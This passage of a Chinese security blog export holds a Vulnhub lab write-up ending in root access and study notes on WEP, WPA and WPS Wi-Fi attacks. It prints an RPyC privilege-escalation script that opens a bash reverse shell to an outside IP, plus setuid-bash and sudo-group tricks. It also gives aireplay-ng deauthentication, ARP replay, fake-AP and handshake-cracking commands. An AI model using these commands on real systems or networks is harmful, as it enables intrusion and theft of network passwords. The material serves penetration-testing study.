root root       4096 Apr 19 18:07 tmp</span></span><br><span class="line"><span class="string">drwxr-xr-x  11 root root       4096 Sep  4  2021 usr</span></span><br><span class="line"><span class="string">drwxr-xr-x  14 root root       4096 Sep  3  2021 var</span></span><br><span class="line"><span class="string">lrwxrwxrwx   1 root root         31 Sep  3  2021 vmlinuz -&gt; boot/vmlinuz-4.15.0-154-generic</span></span><br><span class="line"><span class="string">lrwxrwxrwx   1 root root         31 Sep  3  2021 vmlinuz.old -&gt; boot/vmlinuz-4.15.0-154-generic</span></span><br><span class="line"><span class="string">root@ignite:/# cd /root/</span></span><br><span class="line"><span class="string">root@ignite:~# cat root.txt </span></span><br><span class="line"><span class="string">f0b98d4387ff6da77317e582da98bf31</span></span><br></pre></td></tr></table></figure>
<h3 id="补充">2.3. 补充</h3>
<h4 id="boat-提示">2.3.1. boat 提示</h4>
<p>boat 的提示没明白，看了其他人的WP说是考拉兹猜想【<a
href="http://www.shuxueji.com/w/89">考拉兹猜想-数学百科</a>】<span
class="math inline">\(\Rightarrow\)</span> ragnar 的登录密码
<code>mR)|&gt;^/Gky[gz=\.F#j5P(</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">109</span>  </span><br><span class="line">l = []  </span><br><span class="line">la = []  </span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line"><span class="keyword">while</span> n != <span class="number">1</span>:  </span><br><span class="line">    <span class="keyword">if</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">126</span>):  <span class="comment"># ASCII可打印字符的范围  </span></span><br><span class="line">        l.append(n)  </span><br><span class="line">        la.append(<span class="built_in">chr</span>(n))  </span><br><span class="line">        <span class="built_in">str</span> += <span class="built_in">chr</span>(n)  </span><br><span class="line">    <span class="keyword">if</span> n % <span class="number">2</span> == <span class="number">1</span>:  </span><br><span class="line">        n = <span class="number">3</span> * n + <span class="number">1</span>  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        n = n // <span class="number">2</span>  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span>(l)  </span><br><span class="line"><span class="built_in">print</span>(la)  </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>)  </span><br><span class="line"><span class="comment"># [109, 82, 41, 124, 62, 94, 47, 71, 107, 121, 91, 103, 122, 61, 92, 46, 70, 35, 106, 53, 80, 40]  </span></span><br><span class="line"><span class="comment"># [&#x27;m&#x27;, &#x27;R&#x27;, &#x27;)&#x27;, &#x27;|&#x27;, &#x27;&gt;&#x27;, &#x27;^&#x27;, &#x27;/&#x27;, &#x27;G&#x27;, &#x27;k&#x27;, &#x27;y&#x27;, &#x27;[&#x27;, &#x27;g&#x27;, &#x27;z&#x27;, &#x27;=&#x27;, &#x27;\\&#x27;, &#x27;.&#x27;, &#x27;F&#x27;, &#x27;#&#x27;, &#x27;j&#x27;, &#x27;5&#x27;, &#x27;P&#x27;, &#x27;(&#x27;]  </span></span><br><span class="line"><span class="comment"># mR)|&gt;^/Gky[gz=\.F#j5P(</span></span><br></pre></td></tr></table></figure>
<p>利用 <code>ragnar : mR)|&gt;^/Gky[gz=\.F#j5P(</code> 即可登录 ragnar
用户</p>
<h4 id="提权-1">2.3.2. 提权</h4>
<p>上传 pspy64 可见有个 root 权限的 RPyC 服务器</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404201354328.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404201400401.png" /></p>
<p>尝试利用 RPyC 弹个 root 权限的 shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> rpyc</span><br><span class="line"></span><br><span class="line">c = rpyc.classic.connect(<span class="string">&quot;localhost&quot;</span>)</span><br><span class="line">c.execute(<span class="string">&#x27;import os;os.system(&quot;bash -c \&#x27;bash -i &gt;&amp; /dev/tcp/192.168.159.152/80 0&gt;&amp;1\&#x27;&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><strong>注意</strong>，经测 <strong>80</strong>
端口可正常出网，其他端口没反应……忽略下图报错……</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404201411242.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404201411243.png" /></p>
<p>RPyC 其他方法，如 teleport 方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 来源：https://www.cnblogs.com/cchl/articles/vulnhub_vikings.html</span></span><br><span class="line"><span class="keyword">import</span> rpyc</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shell</span>(): 		<span class="comment"># shell函数将 ragnar加入到sudo这个组中。</span></span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    os.system(<span class="string">&quot;sudo usermod -a -G sudo ragnar&quot;</span>)</span><br><span class="line">conn = rpyc.classic.connect(<span class="string">&quot;localhost&quot;</span>)</span><br><span class="line">fn = conn.teleport(shell)	<span class="comment"># fu是一个在服务端执行的函数，其实就是 shell函数</span></span><br><span class="line">fn()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 来源：https://www.cnblogs.com/upfine/p/16889470.html</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> rpyc</span><br><span class="line">conn = rpyc.classic.connect(<span class="string">&#x27;localhost&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getshell</span>():</span><br><span class="line">        <span class="keyword">import</span> os</span><br><span class="line">        os.system(<span class="string">&#x27;cp /bin/bash /tmp/bashroot &amp;&amp; chmod +s /tmp/bashroot&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">fn = conn.teleport(getshell)</span><br><span class="line">fn()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶场</tag>
        <tag>信息收集</tag>
        <tag>提权</tag>
        <tag>反弹 shell</tag>
        <tag>lxd 提权</tag>
        <tag>Polkit 提权</tag>
      </tags>
  </entry>
  <entry>
    <title>WEP 攻击</title>
    <url>/2022/04/29/WEP%20%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h2 id="wep共享密钥破解">1. WEP共享密钥破解</h2>
<ul>
<li><strong>WEP密码破解原理</strong></li>
<li>IV并非完全随机</li>
<li>每224个包可能出现一次IV重用</li>
<li>收集大量IV之后找到相同IV及其对应密码文，分析得出共享密码</li>
<li>ARP回包中包含IV</li>
<li>IV足够多的情况下，任何复杂程度的wep密码都可以被破解</li>
<li><strong>流程</strong></li>
<li><strong>启动monitor模式</strong></li>
<li><strong>启动抓包并保存抓包</strong></li>
<li><strong>Deauthentication抓包XOR文件</strong></li>
<li><strong>利用XOR文件与AP建立关联</strong></li>
<li><strong>执行ARP重放</strong></li>
<li><strong>Deauthenticiation触发ARP数据包</strong></li>
<li><strong>收集足够DATA之后破解密码</strong></li>
</ul>
<h2 id="fake-authentication">2. FAKE AUTHENTICATION</h2>
<p>WEP破解全部需要首先伪造认证,以便与AP进行正常通信</p>
<p>不产生arp数据包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">aireplay-ng -1 0 -e kifi &lt;AP MAC&gt; -h &lt;YOUR MAC&gt; &lt;INTERFACE&gt;   </span><br><span class="line">Aireplay-ng -1 60 -o 1 -q 10 -e &lt;ESSID&gt; -a &lt;AP MAC&gt; -h &lt;YOUR MAC&gt; &lt;INTERFACE&gt;  </span><br></pre></td></tr></table></figure>
<ul>
<li>每6000秒能发送reauthentication(默认是发送三次)</li>
<li>-o 1 每次身份认证只发一组认证数据包</li>
<li>-q 10 每10秒发keep-live帧</li>
</ul>
<h2 id="fake-authentication-排错">3. FAKE AUTHENTICATION 排错</h2>
<ul>
<li>某些AP验证客户端MAC地址OUI(前三个字节)</li>
<li>MAC地址可能存在过滤</li>
<li>出现Denied(code 1) is WPA in use：</li>
<li>WPA/WPA2不支持Fake authentication</li>
<li>需要使用真实MAC地址</li>
<li>物理上需要靠近AP</li>
<li>侦听信道正确</li>
</ul>
<h2 id="deauthentication-攻击">4. DEAUTHENTICATION 攻击</h2>
<p><strong>用于强制客户端与AP断开连接</strong></p>
<ul>
<li><strong>重连生成ARP请求,AP回包包含IV</strong></li>
<li><strong>WPA重连过程中抓取四步握手过程</strong></li>
<li><strong>但是无客户端情况下此攻击无效</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Aireplay-ng -0 1 -a &lt;AP MAC&gt; -c &lt;Client MAC&gt; &lt;interface name&gt;  </span><br></pre></td></tr></table></figure>
<ul>
<li><strong>不指定-c 参数时候,以广播包攻击所有客户端</strong></li>
<li><strong>每攻击发送128个包,64个给AP,64个给客户端</strong></li>
<li><strong>物理足够接近被攻击者</strong></li>
<li><strong>-0 0(一直发送数据包)</strong></li>
<li><strong>与被攻击者使用相同的无线标准b、g、n</strong></li>
<li><strong>客户端可能拒绝广播帧,建议指定客户端</strong></li>
</ul>
<h2 id="arp重放">5. ARP重放</h2>
<p>侦听正常的ARP包并重放给AP</p>
<p>那么AP的回包中包含大量弱IV，可以用于WEP密码破解</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Aireplay-ng -3 -b &lt;AP MAC&gt; -h &lt;attacker MAC&gt; &lt;interface name&gt;  </span><br></pre></td></tr></table></figure>
<ul>
<li><strong>-h 合法客户端/供给者mac</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Airodump-ng data字段  </span><br></pre></td></tr></table></figure>
<ul>
<li>64bit密钥:建议25万data</li>
<li>128bit密钥:建议150万data</li>
</ul>
<h2 id="破解演示">6. 破解演示</h2>
<p><strong>缺设备，待补 ……</strong></p>
<p><strong>想看实操的可以参见：<a
href="https://blog.csdn.net/SyntaxE/article/details/79522187"
class="uri">https://blog.csdn.net/SyntaxE/article/details/79522187</a></strong></p>
]]></content>
      <categories>
        <category>Kail Linux渗透测试</category>
        <category>无线渗透</category>
      </categories>
      <tags>
        <tag>wifi 渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>WPA 安全系统</title>
    <url>/2022/04/17/WPA%20%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<h2 id="wpa安全系统">1. WPA安全系统</h2>
<p>全称：Wi-Fi Protected Access</p>
<p>802.11组为提高无线安全，开发两个新的链路层加密协议</p>
<p><strong>Temporal Key Integrity Protocol (TKIP)</strong></p>
<p>WPA1 (较之WEP可动态改变密钥，亦可兼容早期网卡)</p>
<p><strong>Counter Mode with CBC-MAC (CCMP)</strong></p>
<p>WP2（不兼容早期网卡）</p>
<p><strong>WPA加密两种安全类型</strong></p>
<ul>
<li><strong>WPA个人：使用预设共享密钥实现身份验证</strong></li>
<li><strong>WPA企业：使用802.1X和Radius服务器实现AAA（认证，授权，记账）</strong></li>
</ul>
<h2 id="wpa1">2. WPA1</h2>
<p>802.11i第三版草案</p>
<p>与WEP比较</p>
<ul>
<li>都采用逐包进行密钥加密</li>
<li><strong>128的key和48位的初向量 (IV)</strong></li>
<li><strong>RC4流加密数据</strong></li>
<li>帧技术避免重放攻击</li>
<li><strong>TKIP使用Michael算法进行完整性校验 (MIC)</strong></li>
<li><strong>WEP CRC32</strong></li>
<li>兼容早期版本硬件</li>
</ul>
<h2 id="wpa2">3. WPA2</h2>
<p>依据802.11i完全重新设计实现</p>
<ul>
<li>也被称为Robust Secruity Network (RSN)</li>
<li><strong>CCMP代替TKIP</strong></li>
<li><strong>AES加密算法取代了RC4</strong></li>
<li>不兼容早期版本硬件</li>
</ul>
<h2 id="wpa企业连接过程">4. WPA企业连接过程</h2>
<ul>
<li><strong>协商安全协议</strong></li>
<li><strong>身份验证</strong></li>
<li><strong>密钥分发和验证</strong></li>
<li><strong>数据加密完整性</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220417145333332-1778384912.png" /></p>
<h2 id="wpa-psk">5. WPA-PSK</h2>
<ul>
<li><strong>协商安全协议</strong></li>
<li><strong>密钥分发和验证</strong></li>
<li><strong>数据加密完整性</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220417145404726-1279464953.png" /></p>
<h2 id="协商安全协议">6. 协商安全协议</h2>
<p><strong>协商认证方式</strong></p>
<ul>
<li><strong>PSK/802.1X</strong></li>
</ul>
<p><strong>单播 和 组播/广播流量加密套件</strong></p>
<ul>
<li><strong>TKIP/CCMP</strong></li>
</ul>
<p>STA通过probe获取无线网络信息</p>
<ul>
<li>速率</li>
<li>加密</li>
<li>通道</li>
<li>名称</li>
</ul>
<h2 id="身份验证wpa企业">7. 身份验证（WPA企业）</h2>
<p><strong>身份认证基于Extensible Authentication
Protocol(EAP)实现</strong></p>
<ul>
<li>EAP-TLS，需要客户端和服务器证书</li>
<li>EAP-TTLS</li>
<li>PEAP混合身份证验证，只需要服务器证书</li>
</ul>
<p><strong>客户端选择身份认证方式</strong></p>
<p><strong>AP发送身份验证信息给Radius Server,</strong></p>
<p><strong>Radius Server返回"Radius Accept"表示认证成功，其中包含 Master
Key (MK)</strong></p>
<p><strong>AP通过EAP消息通知STA认证成功</strong></p>
<p><strong>EAP理解</strong></p>
<ul>
<li><strong><a
href="https://qastack.cn/superuser/373453/8021x-what-exactly-is-it-regarding-wpa-and-eap">802.1X：关于WPA和EAP到底是什么</a></strong></li>
<li><strong><a href="https://zhuanlan.zhihu.com/p/313362386">EAPOL
EAP-TLS和PEAP</a></strong></li>
</ul>
<h2 id="密钥交换">8. 密钥交换</h2>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220417154726833-258753927.png" /></p>
<p>无线网络设计用于一组无线设备通信</p>
<p>关联到同一AP的设备共享无线信道</p>
<p><strong>单播、广播、组播</strong></p>
<ul>
<li>安全特性要求不同</li>
<li><strong>单播通信需要单独密钥加密通信双方流量</strong></li>
<li><strong>pairwise key：对偶密钥(PTK)，T代表的是临时性</strong></li>
<li><strong>组播通信需要信任域内所有成员共享的同一密钥</strong></li>
<li><strong>group key：组密钥(GTK)</strong></li>
</ul>
<h3 id="pmk的生成过程">1、PMK的生成过程</h3>
<p><strong>安全上下的顶级密钥</strong></p>
<ul>
<li><strong>MK进行TLS-PRF加密得出PMK</strong></li>
</ul>
<p><strong>基于服务密钥</strong></p>
<ul>
<li><strong>由上层身份验证方法服务器生成</strong></li>
<li><strong>从服务器通过radius传给AP</strong></li>
<li><strong>从AP通过EAP消息传给所有STA</strong></li>
</ul>
<p><strong>基于PSK共享密钥</strong></p>
<ul>
<li><strong>Essid + PSK + 迭代次数4096-----
&gt;Hash计算生成-----&gt;PMK</strong></li>
</ul>
<p><strong>STA和AP分别计算得出PMK，并不在网络中传递交换</strong></p>
<p>PMK：256位即32字节</p>
<h3 id="ptk的生成过程">2、PTK的生成过程</h3>
<ul>
<li>HMAC-SHA1散列算法<br />
</li>
<li>PRF-X散列算法</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220417160002390-1293533378.png" /></p>
<p>PTK = [Data Encr + Data MIC + EAPOL Encr + EAPOL MIC]</p>
<p>Data Encr(128位)：数据加密 Key</p>
<p>Data MIC：完整性校验 Key</p>
<p>EAPOL Encr： EAPOL协议加密 Key</p>
<p>EAPOL MIC： EAPOL协议完整性校验 Key</p>
<p><strong>四步握手过程生成PTK</strong></p>
<ul>
<li><strong>AP发送Anonce给STA</strong></li>
<li><strong>STA生成Snonce计算出PTK</strong></li>
<li><strong>Snonce加 PTK的MIC发给AP</strong></li>
<li><strong>AP拿到Snonce计算出PTK</strong></li>
<li><strong>AP计算MIC与接收的MIC比对</strong></li>
<li><strong>MIC一致说明确定STA知道PMK</strong></li>
<li><strong>AP发GTK给STA</strong></li>
<li><strong>STA回复ACK并使用密钥加密</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220417155441506-1051231159.png" /></p>
<h3 id="数据加密和完整性">3、数据加密和完整性</h3>
<ul>
<li><strong>Temporal Key Integrity Protocol (TKIP) 4</strong></li>
<li><strong>Counter Mode with CBC-MAC (CCMP) 5</strong></li>
<li><strong>Wireless Robust Authenticated Protocol (WRAP)
6（已停用）</strong></li>
</ul>
]]></content>
      <categories>
        <category>Kail Linux渗透测试</category>
        <category>无线渗透</category>
      </categories>
      <tags>
        <tag>wifi 渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>WPA 攻击</title>
    <url>/2022/05/22/WPA%20%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h2 id="wpa-psk攻击">1. WPA PSK攻击</h2>
<p><strong>学习资源推荐：</strong><a
href="http://etutorials.org/Networking/802.11+security.+wi-fi+protected+access+and+802.11i/"
class="uri">http://etutorials.org/Networking/802.11+security.+wi-fi+protected+access+and+802.11i/</a></p>
<h3 id="破解方法">1、破解方法</h3>
<p>WPA不存在WEP的弱点，只能暴力破解，影响因素：</p>
<ul>
<li>CPU资源</li>
<li>时间</li>
<li>字典质量</li>
<li>网上共享的字典</li>
<li>泄露密码</li>
<li>地区电话号码段</li>
<li>Crunch生成字典</li>
<li>kali中自带的字典文件</li>
</ul>
<h3 id="psk破解过程">2、PSK破解过程</h3>
<ul>
<li><strong>启动monitor</strong></li>
<li><strong>开始抓包并保存</strong></li>
<li><strong>Deauthentication攻击获取4步握手信息（抓不到包的话打断目前存在的连接）</strong></li>
<li><strong>使用字典暴力破解</strong></li>
</ul>
<h3 id="演示">3、演示</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220522164044632-1766109366.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220522163950053-962801940.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220522164545052-1691239370.png" /></p>
<p>如果一直抓不到包时，可用下面命令打断现有连接，在双方自动重新建立连接时可抓到</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220522164738017-103911305.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220522164925489-634548933.png" /></p>
<ul>
<li><strong>kali 常用字典位置</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/usr/share/wordlists]</span><br><span class="line">└─<span class="comment"># ls</span></span><br><span class="line">dirb  dirbuster  fasttrack.txt  fern-wifi  metasploit  nmap.lst  **rockyou.txt**  wfuzz</span><br></pre></td></tr></table></figure>
<h2 id="无ap情况下的wpa密码破解">2. 无AP情况下的WPA密码破解</h2>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220531120837657-873697179.png" /></p>
<ul>
<li><strong>启动monitor</strong></li>
<li><strong>开始抓包并保存</strong></li>
<li><strong>根据 probe 信息伪造相同ESSID的AP</strong></li>
<li><strong>抓取四步握手中的前两个包</strong></li>
<li><strong>使用字典暴力破解</strong></li>
</ul>
<h3 id="原理"><strong>1、原理</strong></h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220522161234084-846682425.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220522161223939-820797855.png" /></p>
<p>依据目标探测的AP，我们自己伪造一个ESSID为其名的AP，然后根据WPA认证机制（上图）我们就可以知道ESSID，ANonce，SNonce，MAC1，MAC2，为此我们只有PSK不知道，但是目标会将PMK（PSK+ESSID计算得来），ANonce，SNonce，MAC1，MAC2计算的MIC和SNonce发给伪造的AP，又因相关加密算法是已知的，所以我们可以暴力枚举可能的PSK值，然后计算MIC，与目标发过来的MIC所对比，当一致时则破解成功。</p>
<h3 id="破解演示"><strong>2、破解演示</strong></h3>
<ul>
<li><strong>启动monitor</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># iwconfig </span></span><br><span class="line">lo        no wireless extensions.</span><br><span class="line"></span><br><span class="line">eth0      no wireless extensions.</span><br><span class="line"></span><br><span class="line">wlan0     IEEE 802.11  ESSID:off/any  </span><br><span class="line">          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   </span><br><span class="line">          Retry short  long <span class="built_in">limit</span>:2   RTS thr:off   Fragment thr:off</span><br><span class="line">          Encryption key:off</span><br><span class="line">          Power Management:off</span><br><span class="line">          </span><br><span class="line">                                                                                                      </span><br><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># airmon-ng start wlan0                     </span></span><br><span class="line"></span><br><span class="line">Found 2 processes that could cause trouble.</span><br><span class="line">Kill them using <span class="string">&#x27;airmon-ng check kill&#x27;</span> before putting</span><br><span class="line">the card <span class="keyword">in</span> monitor mode, they will interfere by changing channels</span><br><span class="line">and sometimes putting the interface back <span class="keyword">in</span> managed mode</span><br><span class="line"></span><br><span class="line">    PID Name</span><br><span class="line">    530 NetworkManager</span><br><span class="line">   1307 wpa_supplicant</span><br><span class="line"></span><br><span class="line">PHY     Interface       Driver          Chipset</span><br><span class="line"></span><br><span class="line">phy1    wlan0           rt2800usb       Ralink Technology, Corp. RT5370</span><br><span class="line">                (mac80211 monitor mode vif enabled <span class="keyword">for</span> [phy1]wlan0 on [phy1]wlan0mon)</span><br><span class="line">                (mac80211 station mode vif disabled <span class="keyword">for</span> [phy1]wlan0)</span><br><span class="line"></span><br><span class="line">                                                                                                      </span><br><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># iwconfig </span></span><br><span class="line">lo        no wireless extensions.</span><br><span class="line"></span><br><span class="line">eth0      no wireless extensions.</span><br><span class="line"></span><br><span class="line">wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=20 dBm   </span><br><span class="line">          Retry short  long <span class="built_in">limit</span>:2   RTS thr:off   Fragment thr:off</span><br><span class="line">          Power Management:off</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>伪造AP</strong></li>
</ul>
<p><strong>airbase-ng帮助信息</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># airbase-ng --help</span></span><br><span class="line"></span><br><span class="line">  Airbase-ng 1.6  - (C) 2008-2020 Thomas d<span class="string">&#x27;Otreppe</span></span><br><span class="line"><span class="string">  Original work: Martin Beck</span></span><br><span class="line"><span class="string">  https://www.aircrack-ng.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  usage: airbase-ng &lt;options&gt; &lt;replay interface&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  Options:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      -a bssid         : set Access Point MAC address</span></span><br><span class="line"><span class="string">      -i iface         : capture packets from this interface</span></span><br><span class="line"><span class="string">      -w WEP key       : use this WEP key to en-/decrypt packets</span></span><br><span class="line"><span class="string">      -h MAC           : source mac for MITM mode</span></span><br><span class="line"><span class="string">      -f disallow      : disallow specified client MACs (default: allow)</span></span><br><span class="line"><span class="string">      -W 0|1           : [don&#x27;</span>t] <span class="built_in">set</span> WEP flag <span class="keyword">in</span> beacons 0|1 (default: auto)</span><br><span class="line">      -q               : quiet (<span class="keyword">do</span> not <span class="built_in">print</span> statistics)</span><br><span class="line">      -v               : verbose (<span class="built_in">print</span> more messages)</span><br><span class="line">      -A               : Ad-Hoc Mode (allows other clients to peer)</span><br><span class="line">      -Y <span class="keyword">in</span>|out|both   : external packet processing</span><br><span class="line">      -c channel       : sets the channel the AP is running on</span><br><span class="line">      -X               : hidden ESSID</span><br><span class="line">      -s               : force shared key authentication (default: auto)</span><br><span class="line">      -S               : <span class="built_in">set</span> shared key challenge length (default: 128)</span><br><span class="line">      -L               : Caffe-Latte WEP attack (use <span class="keyword">if</span> driver can<span class="string">&#x27;t send frags)</span></span><br><span class="line"><span class="string">      -N               : cfrag WEP attack (recommended)</span></span><br><span class="line"><span class="string">      -x nbpps         : number of packets per second (default: 100)</span></span><br><span class="line"><span class="string">      -y               : disables responses to broadcast probes</span></span><br><span class="line"><span class="string">      -0               : set all WPA,WEP,open tags. can&#x27;</span>t be used with -z &amp; -Z</span><br><span class="line">      -z <span class="built_in">type</span>          : sets WPA1 tags. 1=WEP40 2=TKIP 3=WRAP 4=CCMP 5=WEP104</span><br><span class="line">      -Z <span class="built_in">type</span>          : same as -z, but <span class="keyword">for</span> WPA2</span><br><span class="line">      -V <span class="built_in">type</span>          : fake EAPOL 1=MD5 2=SHA1 3=auto</span><br><span class="line">      -F prefix        : write all sent and received frames into pcap file</span><br><span class="line">      -P               : respond to all probes, even when specifying ESSIDs</span><br><span class="line">      -I interval      : sets the beacon interval value <span class="keyword">in</span> ms</span><br><span class="line">      -C seconds       : enables beaconing of probed ESSID values (requires -P)</span><br><span class="line">      -n hex           : User specified ANonce when doing the 4-way handshake</span><br><span class="line"></span><br><span class="line">  Filter options:</span><br><span class="line">      --bssid MAC      : BSSID to filter/use</span><br><span class="line">      --bssids file    : <span class="built_in">read</span> a list of BSSIDs out of that file</span><br><span class="line">      --client MAC     : MAC of client to filter</span><br><span class="line">      --clients file   : <span class="built_in">read</span> a list of MACs out of that file</span><br><span class="line">      --essid ESSID    : specify a single ESSID (default: default)</span><br><span class="line">      --essids file    : <span class="built_in">read</span> a list of ESSIDs out of that file</span><br><span class="line"></span><br><span class="line">      --<span class="built_in">help</span>           : Displays this usage screen</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>示例</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># airbase-ng --essid zmr -c 6 -Z 4  wlan0mon</span></span><br><span class="line">03:04:33  Created tap interface at0</span><br><span class="line">03:04:33  Trying to <span class="built_in">set</span> MTU on at0 to 1500</span><br><span class="line">03:04:34  Access Point with BSSID 1C:BF:CE:3B:5F:BE started.</span><br></pre></td></tr></table></figure>
<p><strong>参数</strong>
：-c指定信道，-Z代表WPA2加密，4是指定CCMP加密</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220531152943647-7300565.png" /></p>
<ul>
<li><strong>抓包破解</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># airodump-ng wlan0mon --essid zmr -w wpa -c 6</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220531152840398-1428627274.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220531153536414-1395490665.png" /></p>
<p><strong>备注：</strong>
大体流程如上，细节可能有问题，因为自己实验时并未破解出密码（实际密码在字典中）</p>
<ul>
<li><strong>解决备注问题（个人理解）</strong></li>
</ul>
<p>station应该对真实AP的MAC在本地做了记录，计算MIC时用的MAC其实是真实AP的MAC，也就是说我们伪造的假AP的MAC需要设成真实AP的MAC，这样抓的包才可成功破解，如下(不是同一WiFi实验的，所以MAC和上面有所不同)：</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220531170747053-1841591761.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220531170832056-1018762647.png" /></p>
<p><strong>WiFi握手包破解速度提升工具：<a
href="https://www.cnblogs.com/z9m8r8/articles/16336553.html"
class="uri">https://www.cnblogs.com/z9m8r8/articles/16336553.html</a></strong></p>
]]></content>
      <categories>
        <category>Kail Linux渗透测试</category>
        <category>无线渗透</category>
      </categories>
      <tags>
        <tag>wifi 渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>WPS 攻击</title>
    <url>/2022/06/02/WPS%20%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h2 id="wps-wireless-protected-setup基本介绍">1. WPS (WIRELESS PROTECTED
SETUP)基本介绍</h2>
<ul>
<li>WPS是WiFi联盟2006年开放的一项技术</li>
<li>通过PIN码来简化无线接入的操作，无需记住PSK</li>
<li>路由器和网卡各按一个按钮就能接入无线</li>
<li>PIN码是分为前后各4位的2段共8位数字</li>
<li><strong>安全漏洞</strong></li>
<li>2011年被发现安全涉及漏洞</li>
<li><strong>接入发起方可以根据路由器的返回信息判断前4位是否正确</strong></li>
<li><strong>而PIN码的后4位只有1000中定义的组合(最后一位是checksum)</strong></li>
<li><strong>所以全部穷举破解只需要11000次尝试，</strong></li>
<li><strong>若采用8位的PSK（包含数字，大小写字母等），破解次数最高可达218,340,105,584,896次
</strong></li>
<li><strong>获得PIN后，可直接请求获取PSK</strong></li>
